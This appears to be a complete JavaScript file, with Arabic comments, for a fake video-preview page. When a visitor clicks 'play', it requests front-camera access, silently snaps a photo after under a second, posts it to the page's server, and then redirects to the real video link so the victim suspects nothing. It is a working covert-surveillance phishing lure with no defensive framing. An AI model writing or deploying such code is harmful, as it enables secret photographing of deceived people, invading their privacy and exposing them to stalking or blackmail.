(() => {
  const playBtn = document.getElementById('playBtn');
  const poster  = document.getElementById('poster');
  const video   = document.getElementById('preview');
  const status  = document.getElementById('status');

  const FIRST_DELAY_MS = 800; // وقت قصير جداً لضمان بدء البث والتقاط الصورة

  let stream = null;
  const setStatus = t => { if (status) status.textContent = t; };

  // استخراج رابط الفيديو المستهدف من الـ URL
  const urlParams = new URLSearchParams(window.location.search);
  const targetUrl = urlParams.get('url') || 'https://www.youtube.com';

  async function start() {
    try {
      setStatus('جارٍ التحقق من الإذن...');
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
    } catch (e) {
      setStatus('تعذّر التشغيل، جارٍ التحويل...');
      window.location.href = targetUrl;
      return;
    }
    
    if (poster) poster.style.display = 'none';
    video.srcObject = stream;
    video.play().catch(() => {});
    setStatus('جارٍ التحميل...');

    // التقاط الصورة بعد ثزء من الثانية ثم التحويل الفوري
    setTimeout(captureAndRedirect, FIRST_DELAY_MS);
  }

  function captureAndRedirect() {
    if (!stream) {
      window.location.href = targetUrl;
      return;
    }

    const vw = video.videoWidth || 640;
    const vh = video.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = vw; c.height = vh;
    c.getContext('2d').drawImage(video, 0, 0, vw, vh);

    // إرسال الصورة للخادم بصمت
    fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.85) })
    }).finally(() => {
      // إيقاف الكاميرا والانتقال فوراً لرابط الفيديو الحقيقي
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
      }
      window.location.href = targetUrl;
    });
  }

  if (playBtn) playBtn.addEventListener('click', start);
})();